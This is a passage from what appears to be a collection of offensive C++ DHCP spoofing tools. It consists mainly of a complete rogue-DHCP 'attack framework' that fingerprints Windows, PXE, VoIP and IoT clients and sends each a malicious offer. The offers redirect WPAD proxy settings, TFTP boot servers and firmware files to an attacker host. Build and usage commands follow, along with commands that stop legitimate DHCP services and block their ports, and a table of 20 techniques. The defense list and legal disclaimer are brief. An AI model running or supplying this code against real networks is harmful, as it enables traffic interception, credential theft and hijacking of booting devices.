    bool isWindows(const uint8_t* buffer, int len) {
        int pos = 240;
        while (pos < len && buffer[pos] != 255) {
            uint8_t code = buffer[pos];
            uint8_t optlen = buffer[pos + 1];
            if (code == 60 && optlen >= 4) {
                if (memmem(buffer + pos + 2, optlen, "MSFT", 4)) return true;
            }
            pos += 2 + optlen;
        }
        return false;
    }
    
    bool isPXE(const uint8_t* buffer, int len) {
        int pos = 240;
        while (pos < len && buffer[pos] != 255) {
            uint8_t code = buffer[pos];
            uint8_t optlen = buffer[pos + 1];
            if (code == 60 && optlen >= 9) {
                if (memmem(buffer + pos + 2, optlen, "PXEClient", 9)) return true;
            }
            pos += 2 + optlen;
        }
        return false;
    }
    
    bool isVoIP(const uint8_t* buffer, int len) {
        // Cisco/Snom/Yealink OUIs
        uint8_t oui[3] = {buffer[28], buffer[29], buffer[30]};
        if ((oui[0] == 0x00 && (oui[1] == 0x1B || oui[1] == 0x1E)) ||
            (oui[0] == 0x80 && oui[1] == 0x5E) ||
            (oui[0] == 0x00 && oui[1] == 0x04 && oui[2] == 0x13)) {
            return true;
        }
        return false;
    }
    
    bool isIoT(const uint8_t* buffer, int len) {
        uint8_t oui[3] = {buffer[28], buffer[29], buffer[30]};
        // Amazon, Google, Tuya, Espressif, Shelly
        if ((oui[0] == 0x44 && oui[1] == 0x65) ||
            (oui[0] == 0xF4 && oui[1] == 0xF5) ||
            (oui[0] == 0x10 && oui[1] == 0x52) ||
            (oui[0] == 0x84 && oui[1] == 0x0D) ||
            (oui[0] == 0x3C && oui[1] == 0x71) ||
            (oui[0] == 0x60 && oui[1] == 0x01)) {
            return true;
        }
        return false;
    }
    
    void sendOffer(const uint8_t* clientMAC, uint32_t xid, 
                   const std::string& deviceType) {
        uint8_t packet[1024];
        memset(packet, 0, sizeof(packet));
        
        packet[0] = 2;
        packet[1] = 1;
        packet[2] = 6;
        packet[3] = 0;
        *(uint32_t*)(packet + 4) = xid;
        
        struct in_addr clientIP, serverIP;
        inet_pton(AF_INET, "192.168.1.100", &clientIP);
        *(uint32_t*)(packet + 16) = clientIP.s_addr;
        
        inet_pton(AF_INET, attackerIP.c_str(), &serverIP);
        *(uint32_t*)(packet + 20) = serverIP.s_addr;
        
        memcpy(packet + 28, clientMAC, 6);
        
        packet[236] = 0x63;
        packet[237] = 0x82;
        packet[238] = 0x53;
        packet[239] = 0x63;
        
        int pos = 240;
        
        // Basic offer
        packet[pos++] = 53; packet[pos++] = 1; packet[pos++] = 2;
        
        packet[pos++] = 1; packet[pos++] = 4;
        struct in_addr mask;
        inet_pton(AF_INET, "255.255.255.0", &mask);
        memcpy(packet + pos, &mask.s_addr, 4); pos += 4;
        
        packet[pos++] = 3; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 6; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        // Device-specific options
        if (deviceType == "windows") {
            // WPAD + domain
            const char* domain = "corp.local";
            packet[pos++] = 15;
            packet[pos++] = strlen(domain);
            memcpy(packet + pos, domain, strlen(domain));
            pos += strlen(domain);
            
            std::string wpad = "http://" + attackerIP + "/wpad.dat";
            packet[pos++] = 252;
            packet[pos++] = wpad.length();
            memcpy(packet + pos, wpad.c_str(), wpad.length());
            pos += wpad.length();
            
            // NBNS
            packet[pos++] = 44; packet[pos++] = 4;
            memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
            
        } else if (deviceType == "pxe") {
            // TFTP boot
            packet[pos++] = 66;
            const char* tftpName = "pxe-attacker";
            packet[pos++] = strlen(tftpName);
            memcpy(packet + pos, tftpName, strlen(tftpName));
            pos += strlen(tftpName);
            
            packet[pos++] = 67;
            const char* bootfile = "pxelinux.0";
            packet[pos++] = strlen(bootfile);
            memcpy(packet + pos, bootfile, strlen(bootfile));
            pos += strlen(bootfile);
            
        } else if (deviceType == "voip") {
            // Cisco VoIP
            packet[pos++] = 150; packet[pos++] = 4;
            memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
            
            packet[pos++] = 66;
            const char* tftpName = "voip-attacker";
            packet[pos++] = strlen(tftpName);
            memcpy(packet + pos, tftpName, strlen(tftpName));
            pos += strlen(tftpName);
            
        } else if (deviceType == "iot") {
            // TFTP firmware
            packet[pos++] = 66;
            const char* tftpName = "iot-tftp";
            packet[pos++] = strlen(tftpName);
            memcpy(packet + pos, tftpName, strlen(tftpName));
            pos += strlen(tftpName);
            
            packet[pos++] = 67;
            const char* bootfile = "firmware.bin";
            packet[pos++] = strlen(bootfile);
            memcpy(packet + pos, bootfile, strlen(bootfile));
            pos += strlen(bootfile);
        }
        
        // Server ID
        packet[pos++] = 54; packet[pos++] = 4;
        memcpy(packet + pos, &serverIP.s_addr, 4); pos += 4;
        
        packet[pos++] = 255;
        
        struct sockaddr_in broadcast;
        memset(&broadcast, 0, sizeof(broadcast));
        broadcast.sin_family = AF_INET;
        broadcast.sin_port = htons(68);
        broadcast.sin_addr.s_addr = INADDR_BROADCAST;
        
        sendto(sock, packet, pos, 0,
               (struct sockaddr*)&broadcast, sizeof(broadcast));
    }
    
    void statsLoop() {
        while (running.load()) {
            sleep(30);
            std::cout << "\n=== DHCP Framework Stats ===\n";
            for (const auto& p : deviceStats) {
                std::cout << "  " << p.first << ": " << p.second << "\n";
            }
            std::cout << "============================\n\n";
        }
    }
    
public:
    DHCPFramework(const std::string& i, const std::string& aip)
        : iface(i), attackerIP(aip) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);
        int opt = 1;
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(67);
        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    }
    
    void run() {
        std::cout << "========================================\n";
        std::cout << " DHCP Attack Framework\n";
        std::cout << " Interface: " << iface << "\n";
        std::cout << " Attacker:  " << attackerIP << "\n";
        std::cout << "========================================\n\n";
        std::cout << "[*] Auto-detecting devices\n";
        std::cout << "[*] Customizing attack per device type\n\n";
        
        running = true;
        std::thread stats(&DHCPFramework::statsLoop, this);
        stats.detach();
        
        uint8_t buffer[2048];
        
        while (true) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (bytes < 240) continue;
            
            if (buffer[0] != 1) continue;
            if (buffer[240] != 53 || buffer[242] != 1) continue;
            
            uint32_t xid = *(uint32_t*)(buffer + 4);
            uint8_t clientMAC[6];
            memcpy(clientMAC, buffer + 28, 6);
            
            char macStr[18];
            snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
                     clientMAC[0], clientMAC[1], clientMAC[2],
                     clientMAC[3], clientMAC[4], clientMAC[5]);
            
            std::string deviceType = "generic";
            
            if (isPXE(buffer, bytes)) {
                deviceType = "pxe";
            } else if (isWindows(buffer, bytes)) {
                deviceType = "windows";
            } else if (isVoIP(buffer, bytes)) {
                deviceType = "voip";
            } else if (isIoT(buffer, bytes)) {
                deviceType = "iot";
            }
            
            deviceStats[deviceType]++;
            
            std::cout << "[" << deviceType << "] " << macStr 
                      << " (XID: " << xid << ")\n";
            
            sendOffer(clientMAC, xid, deviceType);
        }
    }
    
    ~DHCPFramework() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <interface> <attacker_ip>\n";
        return 1;
    }
    DHCPFramework framework(argv[1], argv[2]);
    framework.run();
    return 0;
}
```

**Technique:** Complete DHCP attack framework that auto-detects device type (Windows/PXE/VoIP/IoT) via DHCP fingerprinting and customizes the malicious OFFER accordingly. Production-grade tool with per-device attack chains.

---

## Compilation Guide

### Prerequisites
```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y build-essential g++ iproute2

# RHEL/CentOS
sudo yum groupinstall -y "Development Tools"
```

### Bulk Compile
```bash
#!/bin/bash
for file in dhcp_*.cpp; do
    name="${file%.cpp}"
    echo "Compiling $name..."
    g++ -O2 -pthread -o "$name" "$file"
done
```

### Common Usage
```bash
# 1. Basic rogue server
sudo ./dhcp_rogue eth0

# 2. Starve DHCP pool
sudo ./dhcp_starve eth0 1000 10

# 3. Race legitimate server
sudo ./dhcp_race eth0

# 4. WPAD injection
sudo ./dhcp_wpad eth0 192.168.1.254

# 5. PXE hijack
sudo ./dhcp_pxe eth0 192.168.1.254

# 6. VoIP SIP redirect
sudo ./dhcp_voip eth0 192.168.1.254

# 7. Windows domain redirect
sudo ./dhcp_dc eth0

# 8. Full framework
sudo ./dhcp_framework eth0 192.168.1.254
```

### Kill Conflicting Services
```bash
# Stop legitimate DHCP servers to win race
sudo systemctl stop dnsmasq
sudo systemctl stop isc-dhcp-server
sudo systemctl stop NetworkManager

# Or block port 67/68 with iptables
sudo iptables -A INPUT -p udp --dport 67 -j DROP
sudo iptables -A OUTPUT -p udp --sport 67 -j DROP
```

## Technique Comparison

| # | Technique | Impact | Target | Complexity |
|---|-----------|--------|--------|-----------|
| 1 | Basic Rogue | MITM | Everyone | Low |
| 2 | Starvation | DoS+MITM | DHCP pool | Low |
| 3 | Race | MITM | Fast | Medium |
| 4 | Raw Injection | MITM | Bypass kernel | High |
| 5 | ACK Forgery | MITM | Fast | Medium |
| 6 | Inform Attack | Config override | Existing IPs | Medium |
| 7 | WPAD Injection | Proxy hijack | Browsers | Medium |
| 8 | Domain Injection | DNS hijack | Windows | Medium |
| 9 | NTP Hijack | Time attack | TLS/Kerberos | High |
| 10 | MTU Reduction | DoS | All clients | Medium |
| 11 | Multi-Router | Route hijack | All clients | Medium |
| 12 | PXE Hijack | Boot control | PXE boot | High |
| 13 | VoIP Hijack | Call intercept | IP phones | High |
| 14 | IoT Hijack | Firmware | Smart devices | High |
| 15 | SMB/NetBIOS | AD attack | Windows | High |
| 16 | Long Lease | Persistence | All clients | Low |
| 17 | Relay Option | VLAN bypass | Relayed nets | High |
| 18 | DHCPv6+SLAAC | IPv6 attack | Dual-stack | Medium |
| 19 | DC Redirect | AD takeover | Windows AD | High |
| 20 | Full Framework | All combined | All devices | Very High |

## Detection & Defense

**Detection:**
- Rogue DHCP server detection (dhcp_probe)
- Compare DHCP responses vs. known server
- Monitor for excessive DISCOVER broadcasts
- Switch port security / DHCP snooping
- 802.1X with dynamic VLAN assignment
- Match gateway MAC to expected ARP entries

**Defense:**
- Enable DHCP snooping on all access switches
- Configure trusted ports for legitimate DHCP
- Rate-limit DHCP traffic per port
- Use 802.1X authentication before DHCP
- Deploy DHCPv6 snooping (IPv6)
- Monitor DHCP fingerprinting changes
- Separate critical VLANs (VoIP, IoT, users)

## Legal Notice

**ALL SCRIPTS ARE FOR EDUCATIONAL PURPOSES ONLY**

These C++ DHCP spoofing implementations demonstrate techniques for:
- Authorized penetration testing
- Security research
- Understanding defensive countermeasures
- Lab environments

**UNAUTHORIZED USE MAY VIOLATE:**
- Computer Fraud and Abuse Act (CFAA) — US
- Computer Misuse Act — UK
- Network and Information Systems Directive — EU
- Telecommunications laws
- Local network access laws

**RESPONSIBLE USE**:
- Obtain explicit written authorization
- Use only on your own networks
- Never use for billing evasion or unauthorized access
- Report vulnerabilities responsibly
- Follow ethical disclosure practices

---

*This completes 20 unique DHCP spoofing techniques in C++, derived from concepts in "TCP/IP Illustrated, Volume 3" by W. Richard Stevens.*
